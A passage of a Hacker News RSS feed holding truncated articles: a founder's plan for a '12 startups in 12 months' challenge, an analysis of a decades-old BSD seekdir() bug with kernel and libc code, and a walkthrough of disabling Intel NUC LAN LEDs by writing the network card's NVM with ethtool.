<p><strong>We’ve created 12x Startup: A cohort of 4 motivated makers, each building their own “one startup per month”.</strong></p>

<p>Each day, we post our current task on our public <a href="https://12xstartup.com/" target="_blank">status page</a>. We correspond regularly in Slack, challenge each other’s ideas, and plan
to livestream our monthly demo sessions for you to tune into.</p>

<p><img src="https://monicalent.com/images/12xstartup.jpg" alt="12x Startup Homepage"></p>

<p>Apart from those of us who’ve built other types of profitable projects before,
we’re also inviting advisors who’re a bit further down the path than us.</p>

<p>This approach was inspired by my experience with <a href="https://medium.com/@rrhoover/turn-your-side-project-into-a-company-introducing-weekend-build-c70aebc6d716" target="_blank">Weekend Build</a>.</p>

<p>Knowing that I had to present progress every week to the group was a healthy
amount of pressure.</p>

<p>Having other makers to learn from, plus expert advice
from Ryan and Vedika, changed the trajectory of our <a href="https://affilimate.com/" alt="affiliate analytics tool (opens in a new tab)" target="_blank">affiliate analytics tool</a>
 in 8 weeks.</p>

<p>But I can’t shake the feeling…I’ve made building my first profitable startup much harder than it has to be.</p>

<p>If there were a master list of first-time founder mistakes, I’d
probably check most of the boxes.</p>

<p>18 months into that project and I’m not giving up.</p>

<p>But I am giving myself room to experiment.</p>

<h2 id="define-startup">Define startup</h2>

<p>So what “counts” as a startup? In his <a href="https://levels.io/12-startups-12-months/" target="_blank">original post</a>, Pieter addresses the myth that a startup has to begin
as a world-changing company with $1B valuation potential.</p>

<p>Meanwhile, it’s become clearer than ever that self-funded businesses
starting small can become highly successful:</p>

<ul>
<li>Product Hunt <a href="https://ryanhoover.me/post/69599262875/product-hunt-began-as-an-email-list" target="_blank">began as a newsletter</a> and was later acquired by AngelList</li>
<li>NomadList <a href="https://nomadlist.com/faq" target="_blank">started as a Google Sheet</a> and
now nets over $300K/year</li>
<li>Basecamp <a href="https://stackingthebricks.com/why-you-should-do-a-tiny-product-first/" alt="originated as a whitepaper (opens in a new tab)" target="_blank">originated as a whitepaper</a>
 and today serves 2M+ users</li>
<li>Baremetrics v1 was <a href="https://github.com/Baremetrics/baremetrics-v1" alt="built in a weekend (opens in a new tab)" target="_blank">built in a weekend</a>
 and now $1.5M ARR</li>
</ul>

<p>So for the purpose of 12x Startup, here’s my personal definition:</p>

<blockquote>
<p>An idea in the form of a product that resonates so deeply with a target
market of sufficient size, it’s worth seeing where you can take it.</p>
</blockquote>

<p>Or, to summarize in a word: Momentum.</p>

<p>The first evidence of momentum among my projects came in May when I <a href="https://bloggingfordevs.com/launch-a-newsletter/" target="_blank">launched my newsletter</a>. In just 5 months, it’s grown to over 3.8K subscribers with next to zero marketing.</p>

<p>When there’s momentum behind what you’re creating, my suspicion is you <em>just
know it</em>.</p>

<p>That’s a bit like what I’m looking for, within a few constraints.</p>

<h2 id="the-multitude-of-paths-to-a-million-dollars-a-year">The multitude of paths to a million dollars a year</h2>

<p>Let’s come back to that $1 million investment we were talking about.</p>

<p>In 2018, 17 course creators made over
<a href="https://teachable.com/blog/teachable-this-year" target="_blank">$1 million on Teachable</a>.
Fast forward to 2020, and 12 creators made over $1 million
<a href="https://mobile.twitter.com/ankurnagpal/status/1296841441575133186" target="_blank">during just the second quarter</a>. There are people doing the same on platforms like <a href="https://gaps.com/patreon-earners/" target="_blank">Patreon</a> and <a href="https://www.buzzfeed.com/alexkantrowitz/writers-have-been-trying-to-support-online-themselves-for" target="_blank">Substack</a>.</p>

<p>That is to say, you can make <em>a lot</em> of money by selling information-based products (“info products”) like
ebooks, online courses, substack subscriptions, and so forth.</p>

<p>Plus, you also don’t have to be in the top 1% to do well. As the popular essay
explains, you just need <a href="https://kk.org/thetechnium/1000-true-fans/" target="_blank">1,000 true fans</a> (or perhaps <a href="https://a16z.com/2020/02/06/100-true-fans/" target="_blank">only 100</a>).</p>

<p>That’s why it’s popular advice to start with a small ebook or a mini course before graduating to SaaS.</p>

<p>Building a SaaS product is just a <em>much, much</em> slower and more difficult path to a
million dollars or even “<a href="http://www.paulgraham.com/ramenprofitable.html" target="_blank">ramen profitability</a>”.</p>

<p>A quick ebook launch can put thousands of dollars in your pocket in
a matter of weeks and fund the next venture.</p>

<p>In comparison, our first $2K in SaaS revenue took almost a year to arrive.</p>

<p><strong>Which is to say, I didn’t follow any of this advice about starting small and building
a tiny info product.</strong></p>

<p>Like developers do, I dove headfirst into building something out of software.</p>

<p>There are a few reasons I think I made the right decision, and will continue to do
so for the 12x challenge.</p>

<p>Here are the top two:</p>

<ol>
<li><strong>Comfort can lead to complacency.</strong> I saw this happen when my travel blog reached
$5K/mo in revenue before the pandemic. It’s so easy to lose momentum when something “easy”
is already working and growing, <em>especially</em> when building a SaaS product is inherently difficult.</li>
<li><strong>It’s hard to value an info product-based business.</strong> Companies are valued based on future
earning potential. But here you’re making money based on a cycle of launches,
where you constantly have to create new material. I want to build “12x startups” I <em>could</em> sell,
if I wanted to.</li>
</ol>

<p>If I had to add a third, it’d be that it’s just more fun to build
software products.</p>

<p>I’m a developer afterall :)</p>

<h2 id="the-12x-rules-of-engagement">The 12x rules of engagement</h2>

<p>With these motivations in mind, I’ve placed the following constraints on my <em>personal</em> attempt at the 12 startups in 12 months challenge:</p>

<ul>
<li>No single-sale info products</li>
<li>Doesn’t depend on me, personally, to run it for it to be valuable</li>
<li>Low technical complexity</li>
<li>For most products, a way to test willingness to pay</li>
<li>Testable, scalable traction channels</li>
<li>A growth plan that can be sustained after the month ends</li>
<li>At least one product’s lowest price is a no-brainer at $99/mo</li>
<li>Experiment with both B2B and B2C</li>
<li>Some must leverage my unfair advantages</li>
</ul>

<p>To elaborate on the last point: I have other unique skills, connections, and
advantages above other people who might build the same products.</p>

<p>This includes things like my existing following on Twitter and my newsletter,
experience working in a high-growth tech company, and an existing SaaS codebase
full of reusable material.</p>

<p>I’m not here to prove you can build a startup in a vacuum.</p>

<h2 id="12-startups-in-12-months">12 Startups in 12 Months</h2>

<p>Keeping with tradition, this article will be updated on a monthly basis with each
startup I add to my personal portfolio.</p>

<p>If you want to keep an eye on my progress, you can follow along on Twitter
<a href="https://twitter.com/monicalent" target="_blank">@monicalent</a> and
on our status page at <a href="https://12xstartup.com/" target="_blank">12xstartup.com</a>.</p>





<p><strong>Initial idea:</strong> I’ve been all over the map in terms of my plans for a community for subscribers
of the Blogging for Devs newsletter.</p>

<p>First, I wanted to do a small group of women who blog. Then I had so many requests for a Slack or
Discord that I ended up launching a free, invite-only community built on <a href="http://circle.so/" target="_blank">Circle</a>,
capped at 100 free members.</p>

<p><img src="https://bloggingfordevs.com/images/bfd-pro-screenshot.png" alt="Blogging for Devs Community"></p>

<p>This month, I’ll convert it to a <strong>paid community</strong> for future members and adding more community features and premium content.</p>

<p>(You could say it’s cheating slightly because I’m not starting from scratch, but I’m losing 10 days of the month to my only vacation this year so 🤷🏻‍♀️)</p>

<p>Here’s my planned scope of work for the next four weeks:</p>

<ul>
<li>✨ <strong>Landing Page</strong> — A landing page to build a waitlist already exists <a href="https://bloggingfordevs.com/community/" target="_blank">over here</a>,
but it’ll need improvements and a way to pay and become a member.</li>
<li>🛠 <strong>Unified Experience</strong> — Each member will have a single login to the Community forums on
Circle and the Website, where all the other content will live. This means migrating existing members.</li>
<li>📅 <strong>Events System</strong> — We’ve had a few great virtual events, I want to build something simple
that lets me schedule events, members can RSVP, and get a calendar invite.</li>
<li>🎉 <strong>Member Feed and Goals</strong> — Something where you can see what everyone in the community
has published recently and set and see your progress towards Goals for yourself …</li></ul></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://monicalent.com/12x-startup/">https://monicalent.com/12x-startup/</a></em></p>]]>
            </description>
            <link>https://monicalent.com/12x-startup/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25194509</guid>
            <pubDate>Tue, 24 Nov 2020 02:11:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Desktop laser engraver: how do hobbyists use it to make money?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25194486">thread link</a>) | @Mimowork
<br/>
November 23, 2020 | https://www.mimowork.com/news/desktop-laser-engraver:-how-do-hobbyists-use-it-to-make-money.html | <a href="https://web.archive.org/web/*/https://www.mimowork.com/news/desktop-laser-engraver:-how-do-hobbyists-use-it-to-make-money.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.mimowork.com/news/desktop-laser-engraver:-how-do-hobbyists-use-it-to-make-money.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25194486</guid>
            <pubDate>Tue, 24 Nov 2020 02:08:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When Seekdir() Won't Seek to the Right Position (2008)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25194485">thread link</a>) | @tjalfi
<br/>
November 23, 2020 | https://msys.ch/fixing_seekdir | <a href="https://web.archive.org/web/*/https://msys.ch/fixing_seekdir">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The other day, I got an email from Edd, an OpenBSD user, claiming that Samba would crash when serving files off an MS-DOS filesystem. This was Samba built from sources and not the one from ports. Since I use myself Samba a lot and for a quite large user base, I got interested in the issue and started investigating it. What I found out in the end is a surprise and was not expected: A bug that has been there in all BSDs for almost all the time, since the 4.2BSD times or for roughly 25 years... </p>
<!--break-->
<h2>The Samba Directory Cache</h2>
<p>The Problem With seekdir() In Samba's replacement code I found the following comment, stating the problem from the Samba point of view:</p>
<pre>"This is needed because the existing directory handling in FreeBSD
 and OpenBSD (and possibly NetBSD) doesn't correctly handle unlink()
 on files in a directory where telldir() has been used. On a block
 boundary it will occasionally miss a file when seekdir() is used to
 return to a position previously recorded with telldir().

 This also fixes a severe performance and memory usage problem with
 telldir() on BSD systems. Each call to telldir() in BSD adds an
 entry to a linked list, and those entries are cleaned up on
 closedir(). This means with a large directory closedir() can take an
 arbitrary amount of time, causing network timeouts as millions of
 telldir() entries are freed"
</pre><p>Apparently there are two problems: seekdir() not returning to the position initially retrieved using telldir() and a performance problem. Before digging to much into source code, I decided to check the documentation of said functions, just to make sure, they were being used like they are meant to be used. The OpenBSD manual page is clear: The <strong>seekdir()</strong> function sets the position of the next <strong>readdir()</strong> operation on the named directory stream dirp. The new position reverts to the one associated with the directory stream when the <strong>telldir()</strong> operation was performed. Values returned by <strong>telldir()</strong> are good only for the lifetime of the DIR pointer, dirp, from which they are derived. If the directory is closed and then reopened, the <strong>telldir()</strong> value may be invalidated due to undetected directory compaction. If you don't close the directory stream, seekdir() will take you back to the position previsouly obtained using telldir(). If the system behaves differently, then it's either a bug or the documentation is wrong. If the system indeed does not take you back to the right position, why do we have these functions then in the first place? A look at the closedir() function in OpenBSD reveals that the statement made by the Samba people about performance in closedir() is wrong: In OpenBSD there is no linked list, but a smarter memory handling scheme implemented by Otto Moerbeek (otto@). FreeBSD, however, uses a linked list indeed, but they can switch to our code at any time. So the performance problem really is a non-issue.</p>
<h2>Hunting the seekdir() Bug</h2>
<p><em>As the original author of the *dir() library, you probably fixed one of my bugs :-) Prior to the *dir() commands, programs just opened, read, and interpreted directories directly. I had to update a shocking 22 programs (a large percentage of the programs available on UNIX at the time) to replace their direct interpretation of directories with the *dir() library calls. (Kirk McKusick; private communication) </em></p>
<p>What I needed is a test program to exercise these functions an eventually trigger the behaviour that prevented the Samba people from enabling a directory cache on BSD systems. I wrote a C program that approximately does the following steps:</p>
<ol><li>Create a directory and populate it with a certain number of files</li>
<li>Iterate over the directory using readdir(), recording the position of the entry using telldir() before readdir(), and storing the obtained values in an array</li>
<li>Delete a random number of files and also mark them as deleted in the in-memory array</li>
<li>Iterate over the in-memory array, skipping the entries marked as deleted, and seekdir() to the others, doing a readdir() and compare the returned values with the in-memory copy</li>
<li>Output a message when the in-memory copy and the value returned by readdir() are different</li>
</ol><p>Jeremy told me that the problem occurs with large directories, so I began my tests with really large directories (up to 250'000 entries) and quite quickly I hit the issue. seekdir() won't return me to the recorded position. This kind of confirmed the problem the Samba people were seeing for more than three years. I tweaked the values of my test program, to see if I can find a pattern. But looking at thousands of directory positions, filenames, inode numbers where more likely to turn me mad than to spot the problem... I started lowering the numbers and to my surprise, I could trigger the problem with as little as 10 or 20 files and deleting just one of them. Suddenly, I had a case that shows the problem on every run, no more randomness: Create 28 files, delete file 25 and seekdir to file 26: You end up at file 27! Staring at the output of my program I suddenly saw the pattern as clear as can be: Creating the directory with 28 files had created a directory that spans more than one block on the disk (2 in this case). File 25 was the first entry of the second block. Obviously the problem occured when you delete the first entry in a block of a directory and then return to the recorded position of the second entry in the same block. This would actually get you one entry to far. By that time I had involved Otto to give me a hand and to confirm my findings. His first reaction: An interesting problem... ;) We investigated further and I began looking at the kernel code that removes a directory entry as well as the library code in libc that implements seekdir() and friends.</p>
<h2>How the Kernel Removed Directory Entries</h2>
<p>The kernel function to remove a directory entry, ufs_dirremove(), indeed treats entries that are located at the beginning of a block differently than others:</p>
<pre>        if (dp-&gt;i_count == 0) {
                /*
                 * First entry in block: set d_ino to zero.
                 */
                ep-&gt;d_ino = 0;
        } else {
                /*
                 * Collapse new free space into previous entry.
                 */
                ep-&gt;d_reclen += dp-&gt;i_reclen;
        }
</pre><p>If it is the first entry in a block, the inode number is set to zero, thus invalidating the entry. For all other entries, the record length of the to-be-deleted record is added to the record length of the previous entry. Since the library uses the record length field of an entry to proceed to the next entry in readdir(), this effectively means that the removed entry, while it is still in the block on disc, will no longer be used.</p>
<h2>How the C Library Accesses Directory Entries</h2>
<p>The C library implements the opendir(), telldir(), readdir(), seekdir(), and closedir() functions. These functions were written in the 4.2BSD times so that UNIX programs don't need to handle directories by themselves.</p>
<pre>/*
 * get next entry in a directory.
 */
int
_readdir_unlocked(DIR *dirp, struct dirent **result)
{
        struct dirent *dp;

        *result = NULL;
        for (;;) {
                if (dirp-&gt;dd_loc &gt;= dirp-&gt;dd_size)
                        dirp-&gt;dd_loc = 0;
                if (dirp-&gt;dd_loc == 0) {
                        dirp-&gt;dd_size = getdirentries(dirp-&gt;dd_fd,
                            dirp-&gt;dd_buf, dirp-&gt;dd_len, &amp;dirp-&gt;dd_seek);
                        if (dirp-&gt;dd_size == 0)
                                return (0);
                        if (dirp-&gt;dd_size &lt; 0)
                                return (-1);
                }
                dp = (struct dirent *)(dirp-&gt;dd_buf + dirp-&gt;dd_loc);
                if ((long)dp &amp; 03)      /* bogus pointer check */
                        return (-1);
                if (dp-&gt;d_reclen &lt;= 0 ||
                    dp-&gt;d_reclen &gt; dirp-&gt;dd_len + 1 - dirp-&gt;dd_loc)
                        return (-1);
                dirp-&gt;dd_loc += dp-&gt;d_reclen;
                 if (dp-&gt;d_ino == 0)
                        continue;
                *result = dp;
                return (0);
        }
}
</pre><p>At first sight, this code looks correct. It will skip deleted entries that have their inode number set to zero and it will use the record lenght otherwise. And since a directory traversal using readdir() works just fine, this is code effectively works. A close look at the seekdir() library implementation finally reveals the problem:</p>
<pre>/*
 * seek to an entry in a directory.
 * Only values returned by "telldir" should be passed to seekdir.
 */
void
__seekdir(DIR *dirp, long loc)
{
        struct ddloc *lp;
        struct dirent *dp;

        if (loc &lt; 0 || loc &gt;= dirp-&gt;dd_td-&gt;td_loccnt)
                return;
        lp = &amp;dirp-&gt;dd_td-&gt;td_locs[loc];
        dirp-&gt;dd_td-&gt;td_last = loc;
        if (lp-&gt;loc_loc == dirp-&gt;dd_loc &amp;&amp; lp-&gt;loc_seek == dirp-&gt;dd_seek)
                return;
        (void) lseek(dirp-&gt;dd_fd, (off_t)lp-&gt;loc_seek, SEEK_SET);
        dirp-&gt;dd_seek = lp-&gt;loc_seek;
        dirp-&gt;dd_loc = 0;
        while (dirp-&gt;dd_loc &lt; lp-&gt;loc_loc) {
                _readdir_unlocked(dirp, &amp;dp);
                if (dp == NULL)
                        break;
        }
}
</pre><p>This code will not work as expected when seeking to the second entry of a block where the first has been deleted: seekdir() calls readdir() which happily skips the first entry (it has inode set to zero), and advance to the second entry. When the user now calls readdir() to read the directory entry to which he just seekdir()ed, he does not get the second entry but the third. Much to my surprise I not only found this problem in all other BSDs or BSD derived systems like Mac OS X, but also in very old BSD versions. I first checked 4.4BSD Lite 2, and Otto confirmed it is also in 4.2BSD. The bug has been around for roughly 25 years or more.</p>
<h2>The Solution</h2>
<p>The fix is surprisingly simple, not to say trivial: _readdir_unlocked() must not skip directory entries with inode set to zero when it is called …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://msys.ch/fixing_seekdir">https://msys.ch/fixing_seekdir</a></em></p>]]>
            </description>
            <link>https://msys.ch/fixing_seekdir</link>
            <guid isPermaLink="false">hacker-news-small-sites-25194485</guid>
            <pubDate>Tue, 24 Nov 2020 02:07:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quest to Disable LAN LEDs of an Intel NUC]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25194316">thread link</a>) | @hiq
<br/>
November 23, 2020 | https://pwmon.org/p/1900/quest-disable-lan-leds-intel-nuc/ | <a href="https://web.archive.org/web/*/https://pwmon.org/p/1900/quest-disable-lan-leds-intel-nuc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<h2>Introduction</h2>
<p>The Intel NUC <a href="http://ark.intel.com/products/76978/">D34010WYK</a> has a LAN port with two integrated LEDs. Both are permanently on when a connection is established, with one LED blinking on network activity. This can be rather distracting, particularly at night. So I went on to figure out how to disable the LEDs. It's a general solution that should work with every OS, every NUC, and every somewhat recent Intel NIC (Network Interface Card). Perhaps most devices with an Intel Ethernet controller.</p>
<p>The most obvious and low-tech solution is to tape the LEDs. I haven't tried as an observation led me on a different path. I noticed that a few seconds into booting Ubuntu, the LEDs are briefly switched off. I concluded this must be done through software somehow. This didn't turn out to be entirely correct or useful, as the driver (kernel module) merely resets the controller when it loads, but made me curious enough to proceed.</p>
<p>First, a step back to know the controller used in the NUC.</p>
<p>$ lspci | grep Ethernet
00:19.0 Ethernet controller: Intel Corporation Ethernet Connection I218-V (rev 04)</p>
<p>Intel ARK has <a href="http://ark.intel.com/products/71305/">more information</a>, including a very detailed 262-pages datasheet, which will prove essential.</p>
<h2>Kernel</h2>
<p>I wondered if the option to disable LEDs is perhaps provided through a kernel module parameter. I already knew the  module name for recent Intel Ethernet devices: <i>e1000e</i>. If I hadn't, <a href="https://downloadcenter.intel.com/search?keyword=I218">searching</a> the Intel Download Center for <i>I218</i> and filtering for <i>Linux</i> tells the same. And sure enough, the module is loaded.</p>
<p>$ lsmod | grep e1000e
e1000e                226396  0
ptp                    19395  1 e1000e</p>
<p>Many parameters, but none to change the behavior of LEDs. As confirmed by the <a href="https://www.kernel.org/doc/Documentation/networking/e1000e.txt">documentation</a>.</p>
<p>$ modinfo -p e1000e
debug:Debug level (0=none,...,16=all) (int)
copybreak:Maximum size of packet that is copied to a new buffer on receive (uint)
TxIntDelay:Transmit Interrupt Delay (array of int)
TxAbsIntDelay:Transmit Absolute Interrupt Delay (array of int)
RxIntDelay:Receive Interrupt Delay (array of int)
RxAbsIntDelay:Receive Absolute Interrupt Delay (array of int)
InterruptThrottleRate:Interrupt Throttling Rate (array of int)
IntMode:Interrupt Mode (array of int)
SmartPowerDownEnable:Enable PHY smart power down (array of int)
KumeranLockLoss:Enable Kumeran lock loss workaround (array of int)
WriteProtectNVM:Write-protect NVM [WARNING: disabling this can lead to corrupted NVM] (array of int)
CrcStripping:Enable CRC Stripping, disable if your BMC needs the CRC (array of int)</p>
<p>It turns out such a parameter was <a href="https://sourceforge.net/p/e1000/feature-requests/2/">requested</a> years ago, but denied by Intel with the following explanation.</p>
<p><span></span><span>I'm sorry, but this feature request was evaluated and denied because the majority of our customers require the LEDs to function as-is, and module parameters of this type are unacceptable.</span><span></span></p>
<p>So I downloaded the kernel model <a href="https://downloadcenter.intel.com/download/15817">source</a>, hoping to modify it, and eventually noticed a promising function.</p>
<p>
static s32 e1000_led_off_pchlan(struct e1000_hw *hw)
{
    u16 data = (u16)hw-&gt;mac.ledctl_mode1;
    u32 i, led;

    
    if (!(er32(STATUS) &amp; E1000_STATUS_LU)) {
        for (i = 0; i &lt; 3; i++) {
            led = (data &gt;&gt; (i * 5)) &amp; E1000_PHY_LED0_MASK; 
            if ((led &amp; E1000_PHY_LED0_MODE_MASK) !=
                E1000_LEDCTL_MODE_LINK_UP)
                continue;
            if (led &amp; E1000_PHY_LED0_IVRT)
                data &amp;= ~(E1000_PHY_LED0_IVRT &lt;&lt; (i * 5));
            else
                data |= (E1000_PHY_LED0_IVRT &lt;&lt; (i * 5));
        }
    }

    return e1e_wphy(hw, HV_LED_CONFIG, data);
}</p><p>Perhaps more complex than you'd expect such a simple task to be. Many constants and bit operations. Lots more in related functions. I figured this must be documented, presumably in the <a href="http://www.intel.com/content/dam/www/public/us/en/documents/datasheets/i218-ethernet-connection-datasheet.pdf">datasheet</a>. Browsing it cut my plans to modify the kernel module short, as it spells out a better alternative: NVM (Non-Volatile Memory).</p>
<p><span></span><span>The PHY has three LED outputs that can be configured via the NVM. The default values for the PHY (based on the LED NVM word 0x18 of the LAN region) are listed in the table below.</span><span></span></p>
<picture>
<source type="image/webp" media="(min-resolution:2dppx)" srcset="https://storage.googleapis.com/cdn.pwmon.org/1900/182.x2.webp?201707100332 2x">
<img src="https://storage.googleapis.com/cdn.pwmon.org/1900/182.x1.png?201706071857" srcset="https://storage.googleapis.com/cdn.pwmon.org/1900/182.x2.png?201706071857 2x">
</picture>
<p>If you're wondering why the table mentions 3 LEDs when the LAN port only has 2: the second LED is bi-colored and can switch state to either green (LED2) or amber (LED1).</p>
<p>As a closing note on the kernel module: the code does not do what it appears to. Its only purpose is to provide an interface for blinking a single LED on request, in order to identify a NIC or LAN port. It's unrelated to LEDs blinking on network activity or otherwise, which is done in hardware.</p>
<h2>NVM</h2>
<p>Writeable flash memory, which holds configuration, like the MAC address or power management settings, detailed in the table below. The LED configuration is stored in the previously mentioned word <span>0x18</span>.</p>
<picture>
<source type="image/webp" srcset="https://storage.googleapis.com/cdn.pwmon.org/1900/143+144.x1.webp?201707100332, https://storage.googleapis.com/cdn.pwmon.org/1900/143+144.x2.webp?201707100332 2x">
<img src="https://storage.googleapis.com/cdn.pwmon.org/1900/143+144.x1.png?201706071857" srcset="https://storage.googleapis.com/cdn.pwmon.org/1900/143+144.x2.png?201706071857 2x">
</picture>
<p>A minor detour first to explain the term <i>word</i>. It refers to a 2-byte (16-bit) value in little-endian order, meaning in reverse byte order. So value <span>0x1c10</span> is written <span>0x101c</span> to NVM. Very simple to do manually, by just swapping bytes, but can be done programmatically too. (These will be useful later.)</p>
<p>
def swap(value):
    return hex(value &gt;&gt; 8 | (value &amp; 0xFF) &lt;&lt; 8)

&gt;&gt;&gt; swap(0x1c10)
'0x101c'</p>
<p>
function swap(value) {
    return '0x' + ((value &gt;&gt; 8 | (value &amp; 0xFF) &lt;&lt; 8)).toString(16);
};

&gt; swap(0x1c10)
"0x101c"</p>
<p>Word <span>0x18</span> is encoded as follows.</p>
<picture>
<source type="image/webp" srcset="https://storage.googleapis.com/cdn.pwmon.org/1900/149.x1.webp?201707100332, https://storage.googleapis.com/cdn.pwmon.org/1900/149.x2.webp?201707100332 2x">
<img src="https://storage.googleapis.com/cdn.pwmon.org/1900/149.x1.png?201706071857" srcset="https://storage.googleapis.com/cdn.pwmon.org/1900/149.x2.png?201706071857 2x">
</picture>
<p>It's a bit sequence with 5 bits each per LED. The first 3 bits on each LED set the mode, detailed in the second table. The remaining 2 bits invert and blink the LED. Below is a visual explanation on how to read this, using the default values.</p>
<p><img src="https://storage.googleapis.com/cdn.pwmon.org/1900/f418.x1.png?201706071858" srcset="https://storage.googleapis.com/cdn.pwmon.org/1900/f418.x2.png?201706071858 2x"></p><p>Such a sequence can be used directly with the <span>swap</span> function defined earlier, with <span>0b</span> prefix to indicate bits.</p>
<p>&gt; swap(0b0001100011110100)
"0xf418"</p>
<p>Now to construct a bit sequence to turn LEDs off permanently. As you notice, there is no mode to just flat disable an LED. It's still possible to get effectively the same result. There are two solutions.</p>
<p><span>1</span><span>Set the mode of each LED to <span>010</span>, so LEDs are on on any connection, and set the invert bit on each LED. Ergo, LEDs are off on any connection. With a minor side effect: in case of no connection, LEDs are on. (When the network cable is pulled, or when the opposite side is off.)</span></p>
<picture>
<source type="image/webp" media="(min-resolution:2dppx)" srcset="https://storage.googleapis.com/cdn.pwmon.org/1900/4a29.x2.webp?201707100332 2x">
<img src="https://storage.googleapis.com/cdn.pwmon.org/1900/4a29.x1.png?201706071858" srcset="https://storage.googleapis.com/cdn.pwmon.org/1900/4a29.x2.png?201706071858 2x">
</picture>
<p>&gt; swap(0b0010100101001010)
"0x4a29"</p>
<p><span>2</span><span>Set the mode of each LED to <span>101</span>, so LEDs are on <b>only</b> on a 10Mbps connection. Ergo, LEDs are off for either a 100Mbps or 1Gbps connection. Without side effect, as LEDs stay off in case of no connection.</span></p>
<picture>
<source type="image/webp" media="(min-resolution:2dppx)" srcset="https://storage.googleapis.com/cdn.pwmon.org/1900/a514.x2.webp?201707100333 2x">
<img src="https://storage.googleapis.com/cdn.pwmon.org/1900/a514.x1.png?201706071858" srcset="https://storage.googleapis.com/cdn.pwmon.org/1900/a514.x2.png?201706071858 2x">
</picture>
<p>&gt; swap(0b0001010010100101)
"0xa514"</p>
<p>There are two additional variants to the second solution, which exclude the other link speed combinations each. I'll leave constructing the bit sequence for both as an exercise to the reader. Of both solutions I prefer the second due to lack of side effect when a link speed can be excluded. Usually either 10Mbps or 1Gbps definitely can be. A way to get the negotiated link speed is to use <i>dmesg</i>.</p>
<p>$ dmesg -t | grep e1000e
...
e1000e: eth0 NIC Link is Up 100 Mbps Full Duplex, Flow Control: Rx/Tx</p>
<p>So <span>0xa514</span> it is. Ready to write to NVM. The datasheet tells how.</p>
<p><span></span><span>Intel has an MS-DOS* software utility called EEupdate that is used to program the SPI Flash images in development or production line environments. A copy of this program can be obtained through your Intel Field Service representative.</span><span></span></p>
<p>That's no good. <i>EEupdate</i> is not publicly available. A bit of research reveals another Intel tool named <i>LANConf</i>, available for DOS, Linux, and Windows, which can also write to NVM, but can only be obtained by applying for a <a href="https://www-ssl.intel.com/content/www/us/en/my-intel/design-center-privileged-access-required.html">privileged account</a> and signing a Non-Disclosure Agreement. Fortunately, <i><a href="https://www.kernel.org/pub/software/network/ethtool/">ethtool</a></i> can handle NVM too.</p>
<p>To read from NVM, use as follows. (EEPROM and NVM are used interchangeably from here on.)</p>
<p>% ethtool -e|--eeprom-dump devname [raw on|off] [offset N] [length N]</p>
<p>As per the NVM Address Map, word <span>0x18</span> is at NVM byte offset <span>0x30</span>.</p>
<p>$ sudo ethtool -e eth0 offset 0x30 length 2
Offset      Values
------      ------
0x0030:     f4 18</p>
<p>It matches the default value constructed earlier. Now to the important part: writing to NVM.</p>
<p>% ethtool -E|--change-eeprom devname [magic N] [offset N] [length N] [value N]</p>
<p>So <i>offset</i>, <i>length</i>, and <i>value</i> are obvious, but what does <i>magic</i> refer to? The manual knows.</p>
<p><span></span><span>Because of the persistent nature of writing to the EEPROM, a device-specific magic key must be specified to prevent the accidental writing to the EEPROM.</span><span></span></p>
<p>Where the device-specific magic key can be obtained from isn't documented anywhere. It appears to be kept somewhat secret on purpose. Only the file <i>ethtool.c</i> in the kernel module source code explains it.</p>
<p>eeprom-&gt;magic = adapter-&gt;pdev-&gt;vendor | (adapter-&gt;pdev-&gt;device &lt;&lt; 16);</p>
<p>Here <i>vendor</i> and <i>device</i> refer to <a href="https://pcisig.com/membership">PCI IDs</a>. There are numerous ways to get them, with the easiest perhaps being <i>lspci</i>.</p>
<p>$ lspci -nnq | grep Ethernet
00:19.0 Ethernet controller [0200]: Intel Corporation Ethernet Connection I218-V [<b>8086</b>:<b>1559</b>] (rev 04)</p>
<p>The bold numbers are the <i>vendor</i> and <i>device</i> ID respectively, in hex. So this should give the magic key.</p>
<p>
&gt; '0x' + (0x8086 | (0x1559 &lt;&lt; 16)).toString(16)
"0x15598086"</p>
<p>Very simple. Alright, commence writing.</p>
<p>$ sudo ethtool -E eth0 magic 0x15598086 offset 0x30 length 2 value 0xa514
ethtool: bad command line argument(s)</p>
<p>The value of <i>value</i> can only be a single byte. The <i>length</i> parameter repeats that byte. (This isn't documented.) Both bytes must hence be written separately. </p>
<p>$ sudo ethtool -E eth0 magic 0x15598086 offset 0x30 value 0xa5
Cannot set EEPROM data: Invalid argument</p>
<p>This rather non-descriptive error took me quite a while to figure out. The <i>e1000e</i> kernel module included with the default kernel of Ubuntu 14.04.2 does not support writing to NVM, in this case at least. Intel has <a href="http://www.intel.com/content/www/us/en/support/network-and-i-o/ethernet-products/000005480.html">instructions</a> for compiling and installing the latest kernel module from source. Now it should work.</p>
<p>$ sudo ethtool -E eth0 magic 0x15598086 offset 0x30 value 0xa5
$ sudo ethtool -E eth0 magic 0x15598086 offset 0x31 value 0x14</p>
<p>And it does. Note: the LEDs remain unchanged until either the NUC is reset or the kernel module is reloaded.</p>
<h2>Windows / Mac</h2>
<p>I have not verified, but modifying NVM should also work for other OSes, unless the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pwmon.org/p/1900/quest-disable-lan-leds-intel-nuc/">https://pwmon.org/p/1900/quest-disable-lan-leds-intel-nuc/</a></em></p>]]>
            </description>
            <link>https://pwmon.org/p/1900/quest-disable-lan-leds-intel-nuc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25194316</guid>
            <pubDate>Tue, 24 Nov 2020 01:44:02 GMT</pubDate>
        </item>
        <item>
            <title>
